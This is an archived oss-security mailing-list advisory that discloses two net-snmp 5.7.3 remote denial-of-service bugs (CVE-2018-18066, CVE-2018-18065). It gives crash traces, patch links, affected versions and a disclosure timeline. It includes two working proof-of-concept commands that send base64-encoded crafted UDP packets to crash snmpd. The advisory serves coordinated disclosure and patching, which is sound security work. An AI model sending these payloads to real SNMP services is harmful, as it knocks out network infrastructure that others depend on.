X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["12284" "Monday" "8" "October" "2018" "20:46:29" "+0200" "Magnus Klaaborg Stubman" "magnus@stubman.eu" "<EC9F9CC1-4943-4CD5-8463-F40DF6BCA886@stubman.eu>" "359" "[oss-security] net-snmp 5.7.3 unauthenticated remote Denial of Service (exploit available)" nil nil nil "10" "2018100818:46:29" "[oss-security] net-snmp 5.7.3 unauthenticated remote Denial of Service (exploit available)" (number mark "U       magnus@stubm Oct  8  359/12284 " thread-indent "\"[oss-security] net-snmp 5.7.3 unauthenticated remote Denial of Service (exploit available)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 32500 invoked by uid 550); 8 Oct 2018 19:09:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7193 invoked from network); 8 Oct 2018 18:47:20 -0000
X-Auth-ID: magnus@stubman.eu
X-Sender-Id: magnus@stubman.eu
From: Magnus Klaaborg Stubman <magnus@stubman.eu>
Content-Type: text/plain;
	charset=us-ascii
Content-Transfer-Encoding: quoted-printable
Mime-Version: 1.0 (Mac OS X Mail 11.2 \(3445.5.20\))
Message-Id: <EC9F9CC1-4943-4CD5-8463-F40DF6BCA886@stubman.eu>
Date: Mon, 8 Oct 2018 20:46:29 +0200
To: oss-security@lists.openwall.com
X-Mailer: Apple Mail (2.3445.5.20)
Subject: [oss-security] net-snmp 5.7.3 unauthenticated remote Denial of Service (exploit
 available)

Reference: https://dumpco.re/blog/net-snmp-5.7.3-remote-dos

2018-10-08

NET-SNMP REMOTE DOS
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Back in january I did some vulnerability research of net-snmp 5.7.3 and fou=
nd some bugs.=20
Here they are:

VULN#1 CVE-2018-18066
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

First bug is remotely exploitable without knowledge of the community string=
, and leads to Denial of Service:

  # echo -n "MIG1AgEDMBECBACeXRsCAwD/4wQBBQIBAwQvMC0EDYAAH4iAWdxIYUWiYyICAQ=
gCAgq5BAVwaXBwbwQMBVsKohj9MlusDerWBAAwbAQFgAAAAAYEAKFZAgQsGA29AgEAAgEAMEswD=
QEEAWFFg2MiBAChWQIELBgNvQIBAAIBADBLMA0GCSsGAQIBAgI1LjI1NS4wMCEGEisGNS4yNTUu=
MAEEAYF9CDMKAgEHCobetzgECzE3Mi4zMS4xOS4y" | base64 -d > /dev/udp/127.0.0.1/=
1111

  # net-snmp-5.7.3/agent/snmpd -f -d -V -c ../../snmpd.conf -Ln  127.0.0.1:=
1111
  ASAN:SIGSEGV
  =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
  =3D=3D41810=3D=3DERROR: AddressSanitizer: SEGV on unknown address 0x00000=
0000000 (pc 0x0000007f261b bp 0x7fff34754550 sp 0x7fff34754220 T0)
      #0 0x7f261a in snmp_oid_compare /home/magnus/projects/net-snmp/net-sn=
mp-5.7.3/snmplib/snmp_api.c:6470:13
      #1 0x7f261a in _snmp_parse /home/magnus/projects/net-snmp/net-snmp-5.=
7.3/snmplib/snmp_api.c:4247
      #2 0x7f261a in snmp_parse /home/magnus/projects/net-snmp/net-snmp-5.7=
.3/snmplib/snmp_api.c:4336
      #3 0x7f261a in _sess_process_packet /home/magnus/projects/net-snmp/ne=
t-snmp-5.7.3/snmplib/snmp_api.c:5241
      #4 0x7ef331 in _sess_read /home/magnus/projects/net-snmp/net-snmp-5.7=
.3/snmplib/snmp_api.c:5877:14
      #5 0x7ed2e0 in snmp_sess_read2 /home/magnus/projects/net-snmp/net-snm=
p-5.7.3/snmplib/snmp_api.c:5911:10
      #6 0x7ed2e0 in snmp_read2 /home/magnus/projects/net-snmp/net-snmp-5.7=
.3/snmplib/snmp_api.c:5502
      #7 0x4f9286 in receive /home/magnus/projects/net-snmp/net-snmp-5.7.3/=
agent/snmpd.c:1375:15
      #8 0x4f9286 in main /home/magnus/projects/net-snmp/net-snmp-5.7.3/age=
nt/snmpd.c:1118
      #9 0x7f2561efeb44 in __libc_start_main /build/glibc-6V9RKT/glibc-2.19=
/csu/libc-start.c:287
      #10 0x4f617c in _start (/home/magnus/projects/net-snmp/net-snmp-5.7.3=
/agent/snmpd+0x4f617c)

  AddressSanitizer can not provide additional info.
  SUMMARY: AddressSanitizer: SEGV /home/magnus/projects/net-snmp/net-snmp-5=
.7.3/snmplib/snmp_api.c:6470 snmp_oid_compare
  =3D=3D41810=3D=3DABORTING


Same configuration for both bugs:

  magnus@h4xb0x:~/projects/net-snmp$ cat snmpd.conf
  rocommunity public  default    -V systemonly
  rocommunity public  localhost    -V systemonly
  rouser   authOnlyUser
  syslocation  "On the Desk"
  syscontact  Me <me@example.org>

VULN#2 CVE-2018-18065
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Second bug is remotely exploitable only with knowledge of the community str=
ing (in this case "public") leading to Denial of Service:

  # echo -n "MIGfAgEBBAZwdWJsaWOhgZECATwCAQECAUAwgYUwIgYSKwYBBAGBfQgzCgIBBw=
qG3rc1BAwxNzIuMzEuMTkuNzMwFwYSKwYBAgEBCQEEgQECAAqG3rlgAgECMCMGEgsGAQQBgX0IM=
woCAQcKht63NgQNMjU1LjI1NS4yNTUuMDAhBhIrBgECAQEJBgECAQoDAIbetzgECzE3Mi4zMS4x=
OS4y" | base64 -d > /dev/udp/127.0.0.1/1111

  # net-snmp-5.7.3/agent/snmpd -f -d -V -c ../../snmpd.conf -Ln  127.0.0.1:=
1111
  ASAN:SIGSEGV
  =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
  =3D=3D41062=3D=3DERROR: AddressSanitizer: SEGV on unknown address 0x00000=
0000410 (pc 0x00000075bc0f bp 0x7ffdda226b10 sp 0x7ffdda2269e0 T0)
      #0 0x75bc0e in _set_key /home/magnus/projects/net-snmp/net-snmp-5.7.3=
/agent/helpers/table_container.c:564:9
      #1 0x75bc0e in _data_lookup /home/magnus/projects/net-snmp/net-snmp-5=
.7.3/agent/helpers/table_container.c:614
      #2 0x75bc0e in _container_table_handler /home/magnus/projects/net-snm=
p/net-snmp-5.7.3/agent/helpers/table_container.c:749
      #3 0x572262 in netsnmp_call_handler /home/magnus/projects/net-snmp/ne=
t-snmp-5.7.3/agent/agent_handler.c:526:15
      #4 0x572dc4 in netsnmp_call_next_handler /home/magnus/projects/net-sn=
mp/net-snmp-5.7.3/agent/agent_handler.c:640:12
      #5 0x58751c in table_helper_handler /home/magnus/projects/net-snmp/ne=
t-snmp-5.7.3/agent/helpers/table.c:713:9
      #6 0x572262 in netsnmp_call_handler /home/magnus/projects/net-snmp/ne=
t-snmp-5.7.3/agent/agent_handler.c:526:15
      #7 0x572c79 in netsnmp_call_handlers /home/magnus/projects/net-snmp/n=
et-snmp-5.7.3/agent/agent_handler.c:611:14
      #8 0x520d86 in handle_var_requests /home/magnus/projects/net-snmp/net=
-snmp-5.7.3/agent/snmp_agent.c:2679:22
      #9 0x524dbe in handle_pdu /home/magnus/projects/net-snmp/net-snmp-5.7=
.3/agent/snmp_agent.c:3441:18
      #10 0x51b976 in netsnmp_handle_request /home/magnus/projects/net-snmp=
/net-snmp-5.7.3/agent/snmp_agent.c:3284:14
      #11 0x515876 in handle_snmp_packet /home/magnus/projects/net-snmp/net=
-snmp-5.7.3/agent/snmp_agent.c:1990:10
      #12 0x7f3558 in _sess_process_packet /home/magnus/projects/net-snmp/n=
et-snmp-5.7.3/snmplib/snmp_api.c:5437:7
      #13 0x7ef331 in _sess_read /home/magnus/projects/net-snmp/net-snmp-5.=
7.3/snmplib/snmp_api.c:5877:14
      #14 0x7ed2e0 in snmp_sess_read2 /home/magnus/projects/net-snmp/net-sn=
mp-5.7.3/snmplib/snmp_api.c:5911:10
      #15 0x7ed2e0 in snmp_read2 /home/magnus/projects/net-snmp/net-snmp-5.=
7.3/snmplib/snmp_api.c:5502
      #16 0x4f9286 in receive /home/magnus/projects/net-snmp/net-snmp-5.7.3=
/agent/snmpd.c:1375:15
      #17 0x4f9286 in main /home/magnus/projects/net-snmp/net-snmp-5.7.3/ag=
ent/snmpd.c:1118
      #18 0x7fc1acb11b44 in __libc_start_main /build/glibc-6V9RKT/glibc-2.1=
9/csu/libc-start.c:287
      #19 0x4f617c in _start (/home/magnus/projects/net-snmp/net-snmp-5.7.3=
/agent/snmpd+0x4f617c)

  AddressSanitizer can not provide additional info.
  SUMMARY: AddressSanitizer: SEGV /home/magnus/projects/net-snmp/net-snmp-5=
.7.3/agent/helpers/table_container.c:564 _set_key
  =3D=3D41062=3D=3DABORTING


PATCHES
=3D=3D=3D=3D=3D=3D=3D

Update to net-snmp-5.8 or apply the following patches:

Vuln#1: sourceforge.net/p/net-snmp/code/ci/f23bcd3ac6ddee5d0a48f9703007ccc7=
38914791
Vuln#2: sourceforge.net/p/net-snmp/code/ci/7ffb8e25a0db851953155de91f0170e9=
bf8c457d

AFFECTED
=3D=3D=3D=3D=3D=3D=3D=3D

- 5.7.3
- 5.5.2.1
- 5.6.2.1

More versions may be affected as well.

TIMELINE
=3D=3D=3D=3D=3D=3D=3D=3D

2015-04-11 Vendor releases patch of bug#1 in version control - no public ar=
ticle or otherwise disclosure
2016-10-06 Vendor releases patch of bug#2 in version control - no public ar=
ticle or otherwise disclosure
2018-01-05 I discovered both bugs
2018-01-08 Vendor notified
2018-01-08 Vendor responds - bugs already fixed in version control repo
2018-10-08 Public disclosure of exploit
2018-10-08 CVE-ID assignment


PROOF OF DISCOVERY
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

  # cat vuln1 | base64
  MIG1AgEDMBECBACeXRsCAwD/4wQBBQIBAwQvMC0EDYAAH4iAWdxIYUWiYyICAQgCAgq5BAVwa=
XBw
  bwQMBVsKohj9MlusDerWBAAwbAQFgAAAAAYEAKFZAgQsGA29AgEAAgEAMEswDQEEAWFFg2MiB=
ACh
  WQIELBgNvQIBAAIBADBLMA0GCSsGAQIBAgI1LjI1NS4wMCEGEisGNS4yNTUuMAEEAYF9CDMKA=
gEH
  CobetzgECzE3Mi4zMS4xOS4y
  # sha256sum vuln1
  b2ff63c97c705c25c0043758cbd7b1e00cb5692ba1223712a17461082a047125  vuln1
  twitter.com/magnusstubman/status/949520650762358789

  # cat vuln2 | base64
  MIGfAgEBBAZwdWJsaWOhgZECATwCAQECAUAwgYUwIgYSKwYBBAGBfQgzCgIBBwqG3rc1BAwxN=
zIu
  MzEuMTkuNzMwFwYSKwYBAgEBCQEEgQECAAqG3rlgAgECMCMGEgsGAQQBgX0IMwoCAQcKht63N=
gQN
  MjU1LjI1NS4yNTUuMDAhBhIrBgECAQEJBgECAQoDAIbetzgECzE3Mi4zMS4xOS4y
  # sha256sum vuln2
  b7f0e494b8a91c6fedb7e13b3b8dab68a951b5fdc21dd876ae91eb86924018f2  vuln2
  twitter.com/magnusstubman/status/949520565064404994


REFERENCES
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

- sourceforge.net/p/net-snmp/bugs/2820
- sourceforge.net/p/net-snmp/bugs/2819


CVE ASSIGNMENTS
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> [Suggested description]
> _set_key in agent/helpers/table_container.c in
> Net-SNMP before 5.8
> has a NULL Pointer Exception bug that can be used by an
> authenticated attacker to remotely cause the instance to crash via a craf=
ted UDP packet,
> resulting in Denial of Service.
>
> ------------------------------------------
>
> [Additional Information]
> Proof of concept exploit are publicly available at dumpco.re/blog/net-snm=
p-5.7.3-remote-dos
>
> ------------------------------------------
>
> [VulnerabilityType Other]
> Remote Denial of Service (Null Pointer Exception)
>
> ------------------------------------------
>
> [Vendor of Product]
> net-snmp
>
> ------------------------------------------
>
> [Affected Product Code Base]
> net-snmp - vulnerable: 5.7.3, 5.5.2.1, 5.6.2.1. Fixed in: 5.8
>
> ------------------------------------------
>
> [Affected Component]
> snmpd
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Impact Denial of Service]
> true
>
> ------------------------------------------
>
> [Attack Vectors]
> A crafted UDP packet must be sent to the target.
>
> ------------------------------------------
>
> [Reference]
> dumpco.re/blog/net-snmp-5.7.3-remote-dos
> sourceforge.net/p/net-snmp/code/ci/7ffb8e25a0db851953155de91f0170e9bf8c45=
7d
>
> ------------------------------------------
>
> [Has vendor confirmed or acknowledged the vulnerability?]
> true

Use CVE-2018-18065.


> [Suggested description]
> snmp_oid_compare in snmplib/snmp_api.c in
> Net-SNMP before 5.8
> has a NULL Pointer Exception bug that can be used by an
> unauthenticated attacker to remotely cause the instance to crash via a cr=
afted UDP packet,
> resulting in Denial of Service.
>
> ------------------------------------------
>
> [Additional Information]
> Proof of concept exploit are publicly available at dumpco.re/blog/net-snm=
p-5.7.3-remote-dos
>
> ------------------------------------------
>
> [VulnerabilityType Other]
> Remote Denial of Service (NULL Pointer Exception)
>
> ------------------------------------------
>
> [Vendor of Product]
> net-snmp
>
> ------------------------------------------
>
> [Affected Product Code Base]
> net-snmp - vulnerable: 5.7.3, 5.5.2.1, 5.6.2.1. Fixed in: 5.8
>
> ------------------------------------------
>
> [Affected Component]
> snmpd
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Impact Denial of Service]
> true
>
> ------------------------------------------
>
> [Attack Vectors]
> A crafted UDP packet must be sent to the target.
>
> ------------------------------------------
>
> [Reference]
> dumpco.re/blog/net-snmp-5.7.3-remote-dos
> sourceforge.net/p/net-snmp/code/ci/f23bcd3ac6ddee5d0a48f9703007ccc7389147=
91
> sourceforge.net/p/net-snmp/code/ci/7ffb8e25a0db851953155de91f0170e9bf8c45=
7d
>
> ------------------------------------------
>
> [Has vendor confirmed or acknowledged the vulnerability?]
> true

Use CVE-2018-18066.


- --
CVE Assignment Team
M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
[ A PGP key is available for encrypted communications at
  cve.mitre.org/cve/request_id.html ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJbu5sQAAoJEA2h+fVryJLo8M0P/0PHKRFRLetcB4kLwkzX3Rbo
Hr2FVj83nQEFpbU+R94bhneu1ee54zGTBFnQj6FRqEFgrK4xWE8EwNdrshQSbcRZ
bjPXA/SneIqZlg//Btpa/4HljWgLlwKYoQQD3MzzmuO72yfkfRESOhXpKZLcUP8b
YDATpZERG8oY4TA7zDNj2d3L98U18CcBhNrlBPmEtUnrJcCjsklZM6Cbw0x1DHa1
vBoB2HSJH94Cnl4603vJhrUn7ZAxkuAManul0pTVLhPSryBc4uNptUkWEU2aU9xp
1wvwpsy7syWhlTgJhwH2Gt8EEQxDHFer4AhatkYdjX8hw+SAYoFBDIEQxqPYgu+2
NamzJl6l8NXruw9YzkJhpWpYFusBEikOVHeJoUYGoSZISACduLTmVCne2Axb2Vkg
USjP4jyYi7ZFMVd4uNkEnIUzjJmpKXBGkPqb9VktEAMaLLBgHPJI4ZFuyEYxzU0M
VLKu7ZEu66QvS5vLFEPQcQQPbFrwYMlS4QyCc4KrwyojSWkObX5j9mrLBsb42OQU
B+ilV27e+wJu1kA9hMLHfTT1/AV48JyyVDk5T7SGiVr3sho7HodWFW+Mc5UCgz38
e/ERoBUpod82bmFuQQSdbrDXVfKloyV9h909YJJkL7w37CABHoeySB/ejcDh9ZCJ
5R0qeB5HVvtNE8xM5Oej
=3DWaAB
-----END PGP SIGNATURE-----=
